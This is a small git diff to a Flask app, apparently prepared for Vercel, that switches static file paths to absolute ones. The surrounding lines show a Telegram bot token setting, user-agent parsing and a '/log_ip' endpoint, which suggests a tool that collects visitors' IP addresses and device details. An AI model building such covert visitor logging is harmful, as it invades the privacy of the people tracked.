@@ -2,8 +2,13 @@ from flask import Flask, request, jsonify, send_from_directory
 import requests
 from user_agents import parse
 import os, base64, time
+from pathlib import Path
 
-app = Flask(__name__, static_folder='static', static_url_path='')
+# Vercel paths fix
+BASE_DIR = Path(__file__).resolve().parent
+STATIC_DIR = BASE_DIR / 'static'
+
+app = Flask(__name__, static_folder=str(STATIC_DIR), static_url_path='')
 
 # Vercel Environment Variables se uthayega
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YAHAN_APNA_TOKEN_DALO")
@@ -11,7 +16,7 @@ MY_CHAT_ID = os.environ.get("MY_CHAT_ID", "YAHAN_APNI_CHAT_ID_DALO")
 
 @app.route('/')
 def home():
-    return send_from_directory('static', 'index.html')
+    return send_from_directory(str(STATIC_DIR), 'index.html')
 
 @app.route('/log_ip', methods=['POST'])
 def log_ip():
